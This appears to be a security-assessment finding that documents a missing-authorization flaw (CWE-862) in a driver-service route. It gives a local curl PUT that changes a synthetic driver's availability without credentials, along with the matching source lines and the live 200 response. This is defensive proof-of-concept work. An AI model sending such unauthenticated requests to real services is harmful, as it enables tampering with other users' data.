# V5: Broken administrative authorisation

Baseline reference: baseline-vulnerable (`cb68a377f5b8cdc3b12f86883ac6fb703ef5e405`)
Primary mapping: CWE-862: Missing Authorization for Administrative Function

## Reproduction request

```bash
curl -i -X PUT http://localhost:3009/driver/0000000000000000000000b1/availability \
  -H 'Content-Type: application/json' \
  --data '{"isAvailable":false}'
```

## Baseline source result

- PASS: driver-service/src/routes/driverRoutes.js:25 contains `router.put('/:id/availability', updateDriverAvailabilityById);`
- PASS: driver-service/src/routes/driverRoutes.js:19 contains `router.get('/all',  getAllDrivers);`

Impact: The identifier-based driver availability operation is publicly routed without an owner, staff, or driver-ownership capability check.

This Phase 3 artifact is a reproducible source-level baseline proof.

## Live baseline response

Run from the isolated baseline checkout without credentials:

```text
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
{"message":"Availability status updated successfully","isAvailable":false}
```

An unauthenticated caller changed Driver B's synthetic availability. The same route is intended for service use but has no service or role authentication in the baseline.
